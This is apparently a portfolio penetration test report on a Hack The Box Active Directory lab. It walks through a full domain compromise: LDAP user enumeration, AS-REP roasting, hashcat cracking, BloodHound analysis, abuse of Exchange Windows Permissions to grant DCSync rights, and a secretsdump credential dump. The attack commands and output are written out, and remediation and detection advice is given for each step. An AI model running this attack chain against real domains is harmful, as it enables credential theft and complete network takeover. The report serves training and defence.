# Active Directory Penetration Test Report

| Field | Detail |
|-------|--------|
| **Classification** | Confidential |
| **Target Environment** | Active Directory — Windows Server 2016 |
| **Report Status** | Final |
| **Assessment Type** | Infrastructure / Internal Network Penetration Test |


---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Rules of Engagement](#2-scope--rules-of-engagement)
3. [Methodology](#3-methodology)
4. [Attack Chain Overview](#4-attack-chain-overview)
5. [Findings](#5-findings)
   - [FIND-01 · Unauthenticated LDAP User Enumeration](#find-01--unauthenticated-ldap-user-enumeration)
   - [FIND-02 · Kerberos AS-REP Roasting](#find-02--kerberos-as-rep-roasting)
   - [FIND-03 · Weak Service Account Password](#find-03--weak-service-account-password)
   - [FIND-04 · Excessive Delegated Administrative Privileges](#find-04--excessive-delegated-administrative-privileges)
   - [FIND-05 · Misconfigured Active Directory ACL — DCSync Rights](#find-05--misconfigured-active-directory-acl--dcsync-rights)
   - [FIND-06 · Full Domain Compromise via DCSync](#find-06--full-domain-compromise-via-dcsync)
6. [Technical Narrative](#6-technical-narrative)
   - [Phase 1: Reconnaissance & Target Discovery](#phase-1-reconnaissance--target-discovery)
   - [Phase 2: Domain User Enumeration](#phase-2-domain-user-enumeration)
   - [Phase 3: AS-REP Roasting & Credential Access](#phase-3-as-rep-roasting--credential-access)
   - [Phase 4: Active Directory Enumeration](#phase-4-active-directory-enumeration)
   - [Phase 5: Privilege Escalation](#phase-5-privilege-escalation)
   - [Phase 6: Domain Compromise](#phase-6-domain-compromise)
7. [Remediation Summary](#7-remediation-summary)
8. [Appendix](#8-appendix)

---

## 1. Executive Summary

An internal penetration test was conducted against an Active Directory environment running on Windows Server 2016. The assessment resulted in **full domain compromise**, achieved through a chain of misconfigurations and weak security controls.

The attack began with unauthenticated enumeration of domain users via an exposed LDAP service. A service account was identified with Kerberos pre-authentication disabled, allowing an encrypted authentication ticket to be captured and cracked offline without any prior credentials. The recovered password provided authenticated access to the domain.

With valid credentials, BloodHound analysis revealed a privilege escalation path through delegated administrative groups. By abusing misconfigured permissions on the Active Directory domain object, directory replication rights were granted to an attacker-controlled account. This enabled a **DCSync attack**, resulting in the extraction of credential hashes for all domain accounts — including the **Domain Administrator** and **KRBTGT** service account.

Compromise of the KRBTGT account enables the creation of **Golden Tickets**, providing persistent, near-unrevocable administrative access to the entire domain.

### Risk Summary

| Finding | Severity | Status |
|---------|----------|--------|
| Unauthenticated LDAP User Enumeration | Medium | Open |
| Kerberos AS-REP Roasting | High | Open |
| Weak Service Account Password | High | Open |
| Excessive Delegated Administrative Privileges | Critical | Open |
| Misconfigured Active Directory ACL (DCSync Rights) | Critical | Open |
| Full Domain Compromise via DCSync | Critical | Open |

> ⚠️ **Full remediation of these findings is strongly recommended. Domain compromise enables an attacker to impersonate any user, access all systems, and establish persistent control that survives password resets.**

---

## 2. Scope & Rules of Engagement

| Item | Detail |
|------|--------|
| **In-Scope Target** | `<target-ip>` |
| **Domain** | `<redacted>` |
| **Assessment Type** | Black Box — No credentials provided at start |
| **Out of Scope** | Denial of Service, Physical Access, Social Engineering |
| **Authorisation** | Written authorisation obtained prior to testing |

---

## 3. Methodology

This assessment followed the **Penetration Testing Execution Standard (PTES)** and findings are mapped to the **MITRE ATT&CK Framework**.

```
Reconnaissance → Enumeration → Initial Access → Credential Access
      → Privilege Escalation → Lateral Movement → Domain Compromise
```

| Phase | Approach |
|-------|----------|
| Reconnaissance | Network scanning, service fingerprinting (Nmap) |
| Enumeration | LDAP user enumeration, Kerberos pre-auth analysis |
| Credential Access | AS-REP Roasting, offline hash cracking |
| Post-Exploitation | BloodHound AD enumeration, attack path analysis |
| Privilege Escalation | Delegated group abuse, ACL manipulation |
| Domain Compromise | DCSync credential dumping |

---

## 4. Attack Chain Overview

The diagram below illustrates the full attack path from unauthenticated access to domain compromise.

```
[Unauthenticated]
      │
      ▼
 LDAP Enumeration ──► Valid usernames discovered
      │
      ▼
 AS-REP Roasting ──► Encrypted hash captured (svc-alfresco)
      │
      ▼
 Offline Cracking ──► Plaintext password recovered
      │
      ▼
 BloodHound Analysis ──► Escalation path identified
      │
      ▼
 Delegated Group Abuse ──► Added to Exchange Windows Permissions
      │
      ▼
 ACL Manipulation ──► DCSync rights granted to attacker account
      │
      ▼
 DCSync Attack ──► All domain hashes dumped (Administrator, KRBTGT)
      │
      ▼
 [Full Domain Compromise]
```

> 📸 *BloodHound attack path screenshot — see Appendix A*

---

## 5. Findings

---

### FIND-01 · Unauthenticated LDAP User Enumeration

| Field | Detail |
|-------|--------|
| **Severity** | Medium |
| **CVSS v3.1 Score** | 5.3 |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Affected Asset** | `<target-ip>` — LDAP (389/tcp) |
| **MITRE ATT&CK** | [T1087.002](https://attack.mitre.org/techniques/T1087/002/) — Account Discovery: Domain Account |

#### Description

The LDAP service on the domain controller permitted unauthenticated queries, allowing enumeration of valid domain user accounts without credentials. This exposed the full list of domain users to any unauthenticated attacker with network access.

#### Evidence

```bash
nxc ldap <target-ip> --users
```

```text
sebastien
lucinda
andy
mark
santi
svc-alfresco
```

#### Business Impact

Valid usernames provide a foundation for targeted password attacks and Kerberos-based attacks. This finding directly enabled **FIND-02**.

#### Remediation

- Restrict anonymous/unauthenticated LDAP queries on all domain controllers
- Require authentication for all LDAP bind operations
- Limit LDAP access at the network level to authorised hosts only

---

### FIND-02 · Kerberos AS-REP Roasting

| Field | Detail |
|-------|--------|
| **Severity** | High |
| **CVSS v3.1 Score** | 7.5 |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Affected Asset** | `svc-alfresco` — Kerberos (88/tcp) |
| **MITRE ATT&CK** | [T1558.004](https://attack.mitre.org/techniques/T1558/004/) — Steal or Forge Kerberos Tickets: AS-REP Roasting |

#### Description

The service account `svc-alfresco` was configured with the `UF_DONT_REQUIRE_PREAUTH` flag enabled, disabling Kerberos pre-authentication. This allows any unauthenticated user to request an AS-REP ticket containing material encrypted with the account's password hash, which can then be cracked offline.

#### Evidence

```bash
GetNPUsers.py <redacted-domain>/ -usersfile users.txt -dc-ip <target-ip> -no-pass
```

```text
$krb5asrep$23$svc-alfresco:0bc62f49bf3a967469687aea530f2<redacted>d59$183580b8d285f569f49be3
de3770c7f59c9029f8b19392a5844916e4a1f
```

#### Business Impact

Successful cracking of the AS-REP hash yields valid domain credentials without any prior access. This finding directly enabled **FIND-03** and all subsequent attack phases.

#### Remediation

- Enable Kerberos pre-authentication on all accounts
- Audit using: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`
- Alert on `EventID 4768` with `PreAuthType = 0` in SIEM

---

### FIND-03 · Weak Service Account Password

| Field | Detail |
|-------|--------|
| **Severity** | High |
| **CVSS v3.1 Score** | 7.5 |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Affected Asset** | `svc-alfresco` |
| **MITRE ATT&CK** | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) — Brute Force: Password Cracking |

#### Description

The AS-REP hash for `svc-alfresco` was cracked offline against the `rockyou.txt` wordlist in a trivial amount of time. The password was present in a common wordlist, indicating it does not meet an acceptable standard for a privileged service account.

#### Evidence

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

```text
svc-alfresco : <redacted>
```

#### Business Impact

Recovery of the plaintext password provided authenticated domain access, enabling all subsequent stages of the attack chain.

#### Remediation

- Enforce a minimum 25-character password for all service accounts
- Deploy **Group Managed Service Accounts (gMSA)** to eliminate static passwords — Windows manages rotation automatically
- Audit service account password age and complexity regularly

---

### FIND-04 · Excessive Delegated Administrative Privileges

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.0 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Affected Asset** | Active Directory — Group Delegation Configuration |
| **MITRE ATT&CK** | [T1484.001](https://attack.mitre.org/techniques/T1484/001/) — Domain Policy Modification |

#### Description

BloodHound analysis revealed that `svc-alfresco` held membership in a privileged group chain, granting it the ability to manage domain user accounts and modify membership of the **Exchange Windows Permissions** group. This group holds `WriteDACL` permissions over the domain object, allowing any member to modify the domain's ACL — including granting replication rights.

#### Evidence

> 📸 *See Appendix A — BloodHound attack path graph*

Delegation chain identified by BloodHound:

```
svc-alfresco
  └─► Account Operators (GenericAll)
        └─► Exchange Windows Permissions (WriteDACL on Domain Object)
              └─► DCSync Rights (Replicating Directory Changes)
```

New attacker-controlled account created via delegated privileges:

```bash
bloodyAD --host <target-ip> -d '<redacted-domain>' -u 'svc-alfresco' \
  -p '<redacted-password>' add user 'NewUser' '<redacted-password>'
```

```text
[+] NewUser created
```

Attacker-controlled account added to Exchange Windows Permissions:

```bash
bloodyAD --host <target-ip> -d '<redacted-domain>' -u 'svc-alfresco' \
  -p '<redacted-password>' add groupMember \
  'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=<redacted>,DC=<redacted>' \
  'NewUser'
```

```text
[+] NewUser added to CN=Exchange Windows Permissions
```

#### Business Impact

This misconfiguration formed the critical link in the privilege escalation chain, enabling a low-privileged service account to ultimately achieve domain compromise.

#### Remediation

- Remove unnecessary members from **Account Operators** and review all delegated administrative groups
- Remove `WriteDACL` from **Exchange Windows Permissions** on the domain object — this is a known misconfiguration introduced by legacy Exchange installations
- Run BloodHound regularly to identify dangerous delegation paths
- Apply the principle of least privilege to all service accounts and administrative groups

---

### FIND-05 · Misconfigured Active Directory ACL — DCSync Rights

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.0 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Affected Asset** | Active Directory Domain Object |
| **MITRE ATT&CK** | [T1222.001](https://attack.mitre.org/techniques/T1222/001/) — File and Directory Permissions Modification |

#### Description

By leveraging `WriteDACL` permissions on the domain object via Exchange Windows Permissions group membership, directory replication rights were granted to the attacker-controlled account. These rights — **Replicating Directory Changes** and **Replicating Directory Changes All** — are normally reserved exclusively for domain controllers.

#### Evidence

```powershell
$pass = ConvertTo-SecureString '<redacted-password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<domain>\NewUser', $pass)
Add-ObjectACL -PrincipalIdentity NewUser -Credential $cred -Rights DCSync
```

| Permission Granted | Description |
|--------------------|-------------|
| `Replicating Directory Changes` | Allows replication of directory data |
| `Replicating Directory Changes All` | Allows replication of all directory data including credential secrets |

#### Business Impact

Possession of these rights allows any account to perform a DCSync attack, directly enabling **FIND-06**.

#### Remediation

- Audit the domain object ACL and remove any non-DC accounts holding replication rights:
  ```powershell
  (Get-Acl "AD:\DC=<domain>,DC=<tld>").Access | Where-Object {
    $_.ActiveDirectoryRights -match "ExtendedRight" -and
    $_.ObjectType -match "1131f6aa|1131f6ad"
  }
  ```
- Alert on `EventID 4662` for replication rights changes on the domain object

---

### FIND-06 · Full Domain Compromise via DCSync

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 10.0 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Affected Asset** | Active Directory Domain — All Accounts |
| **MITRE ATT&CK** | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) — OS Credential Dumping: DCSync |

#### Description

With directory replication rights granted, a DCSync attack was performed using Impacket's `secretsdump`. This technique mimics the behaviour of a domain controller requesting replication updates, causing the DC to return credential material for all domain accounts without requiring interactive logon or code execution on any host.

#### Evidence

```bash
secretsdump <redacted-domain>/NewUser@<target-ip>
```

```text
[*] Dumping Domain Credentials

<redacted-domain>\Administrator:500:<redacted>:<redacted>
<redacted-domain>\krbtgt:502:<redacted>:<redacted>
<...SNIP...>
```

#### Business Impact

This represents **complete Active Directory domain compromise**. With the KRBTGT hash, an attacker can forge **Golden Tickets** — Kerberos tickets valid for any account on any system, that persist even after password resets. Full impact includes:

- Credential theft for every domain user and service account
- Unrestricted lateral movement across all domain-joined systems
- Ability to impersonate any identity including Domain Admins
- Persistent access via Golden Tickets that survives most incident response actions
- Platform for ransomware deployment or destructive attacks across the entire environment

#### Remediation

- **Immediate:** Reset the KRBTGT account password **twice** (required to invalidate all existing Kerberos tickets)
- **Immediate:** Reset all Domain Admin and privileged account passwords
- Rotate all service account credentials
- Hunt for persistence indicators: new accounts, scheduled tasks, GPO modifications, unusual registry keys
- Remediate all upstream findings (FIND-01 through FIND-05) to close the attack path

---

## 6. Technical Narrative

This section documents the full attack chain in chronological order for technical readers.

---

### Phase 1: Reconnaissance & Target Discovery

Initial network scanning identified the target host as a **Windows Server 2016 Domain Controller** based on the combination of exposed services.

```bash
nmap -sC -sV -T4 <target-ip> -oA nmap_initial
```

```text
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds Windows Server 2016 Standard
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
```

The combination of DNS (53), Kerberos (88), LDAP (389), SMB (445), and Global Catalog (3268) is characteristic of a domain controller. SMB enumeration confirmed that message signing was enforced, ruling out NTLM relay attacks. Kerberos and LDAP services were prioritised for further enumeration.

---

### Phase 2: Domain User Enumeration

Unauthenticated LDAP queries against the domain controller returned a full list of valid domain user accounts (FIND-01).

```bash
nxc ldap <target-ip> --users
```

Accounts discovered: `sebastien`, `lucinda`, `andy`, `mark`, `santi`, `svc-alfresco`

These were saved to `users.txt` for use in subsequent Kerberos attacks.

---

### Phase 3: AS-REP Roasting & Credential Access

Each discovered account was tested for the `UF_DONT_REQUIRE_PREAUTH` flag. The service account `svc-alfresco` was found vulnerable (FIND-02), allowing an AS-REP ticket to be requested without credentials. The captured hash was cracked offline using hashcat mode `18200` against `rockyou.txt` (FIND-03), recovering valid plaintext credentials.

---

### Phase 4: Active Directory Enumeration

Authenticated BloodHound collection was performed using the recovered credentials to map the domain's privilege relationships.

```bash
bloodhound-python -d <redacted-domain> -u svc-alfresco -p '<redacted-password>' \
  -dc <redacted-domain-controller> -ns <redacted-ip> -c All
```

```text
Found 2 computers · Found 32 users · Found 76 groups · Found 2 GPOs · Found 15 OUs
```

The **Shortest Paths to Domain Admins** query in BloodHound identified a privilege escalation path originating from `svc-alfresco` through the Account Operators and Exchange Windows Permissions groups to the domain object.

---

### Phase 5: Privilege Escalation

Leveraging the delegated privileges identified in BloodHound (FIND-04):

**Step 1** — A new attacker-controlled account was created using Account Operators membership.

**Step 2** — The new account was added to the **Exchange Windows Permissions** group, which holds `WriteDACL` on the domain object.

**Step 3** — DCSync rights were granted to the attacker-controlled account by modifying the domain object's ACL (FIND-05).

```powershell
Add-ObjectACL -PrincipalIdentity NewUser -Credential $cred -Rights DCSync
```

---

### Phase 6: Domain Compromise

With replication rights in place, `secretsdump` was used to perform a DCSync attack against the domain controller (FIND-06), dumping NTLM hashes for all domain accounts including **Administrator** and **KRBTGT**.

---

## 7. Remediation Summary

| # | Finding | Severity | Action | Priority |
|---|---------|----------|--------|----------|
| FIND-01 | Unauthenticated LDAP Enumeration | Medium | Disable anonymous LDAP queries | Medium |
| FIND-02 | AS-REP Roasting | High | Enable Kerberos pre-authentication on all accounts | High |
| FIND-03 | Weak Service Account Password | High | Deploy gMSA; enforce strong password policy | High |
| FIND-04 | Excessive Delegated Privileges | Critical | Audit group delegations; remove Exchange WriteDACL | Immediate |
| FIND-05 | Misconfigured AD ACL (DCSync) | Critical | Audit domain object ACL; remove non-DC replication rights | Immediate |
| FIND-06 | Domain Compromise via DCSync | Critical | Reset KRBTGT twice; rotate all privileged credentials | Immediate |

---

## 8. Appendix

### A — BloodHound Attack Path
![Bloodhound_Attack_Path](image/bloodhound_start.png)
![BloodHound Attack Path](images/bloodhound_1.png)

*Figure 1,2: BloodHound graph showing the privilege escalation path from svc-alfresco to domain compromise via Exchange Windows Permissions WriteDACL abuse.*

---

### B — Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Network scanning and service enumeration |
| NetExec (nxc) | LDAP enumeration |
| Impacket GetNPUsers | AS-REP Roasting |
| Hashcat | Offline hash cracking |
| BloodHound / bloodhound-python | Active Directory attack path analysis |
| bloodyAD | Active Directory object manipulation |
| PowerView | ACL modification |
| Impacket secretsdump | DCSync credential dumping |

---

### C — MITRE ATT&CK TTP Summary

| TTP ID | Technique | Finding |
|--------|-----------|---------|
| [T1087.002](https://attack.mitre.org/techniques/T1087/002/) | Account Discovery: Domain Account | FIND-01 |
| [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | AS-REP Roasting | FIND-02 |
| [T1110.002](https://attack.mitre.org/techniques/T1110/002/) | Brute Force: Password Cracking | FIND-03 |
| [T1484.001](https://attack.mitre.org/techniques/T1484/001/) | Domain Policy Modification | FIND-04 |
| [T1222.001](https://attack.mitre.org/techniques/T1222/001/) | File and Directory Permissions Modification | FIND-05 |
| [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | OS Credential Dumping: DCSync | FIND-06 |

---

### D — Port & Service Reference

| Port | Service | Description |
|------|---------|-------------|
| 53/tcp | DNS | Active Directory service discovery |
| 88/tcp | Kerberos | Primary AD authentication protocol |
| 135/tcp | MSRPC | Windows Remote Procedure Call |
| 139/tcp | NetBIOS | Legacy SMB communication |
| 389/tcp | LDAP | Directory service queries |
| 445/tcp | SMB | File sharing and remote administration |
| 464/tcp | kpasswd5 | Kerberos password change |
| 593/tcp | RPC over HTTP | Remote procedure calls over HTTP |
| 636/tcp | LDAPS | Encrypted LDAP |
| 3268/tcp | Global Catalog | Forest-wide AD search |
| 3269/tcp | Global Catalog SSL | Encrypted global catalog |

---

*This report was produced for portfolio and educational purposes based on a Hack The Box lab environment. All findings relate to a controlled, authorised testing environment.*
